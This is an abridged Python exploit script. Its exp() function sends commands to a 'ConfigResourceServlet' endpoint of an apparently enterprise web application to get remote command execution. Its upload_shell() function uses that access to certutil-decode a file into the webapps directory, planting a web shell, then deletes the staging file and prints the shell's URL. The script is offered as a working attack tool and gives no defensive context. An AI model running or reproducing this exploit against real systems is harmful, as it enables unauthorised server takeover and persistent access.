...
def exp(target:Target,url:str = None,cmd:str = "whoami", verbose:bool = True) -> str:
        result:str = 0
        try:
            headers={
            ...
            url = f"{target.url}/servlet/~ic/nc.bs.framework.server.ConfigResourceServlet"
            ...
            response = target.session.post(url=url, data=data, headers=headers, timeout=10)
...
def upload_shell(target:Target, file_path:str):
    ...
    r=exp(target=target,cmd=f"certutil -decode {basename(file_path)}.txt .\\webapps\\nc_web\\{basename(file_path)}",verbose=False)
    if "FILE_EXISTS" in r:
        ...
        return
    exp(target=target,cmd=f"del {basename(file_path)}.txt",verbose=False)
    print(f"{target.url}/{basename(file_path)}")
    return f"{target.url}/{basename(file_path)}"
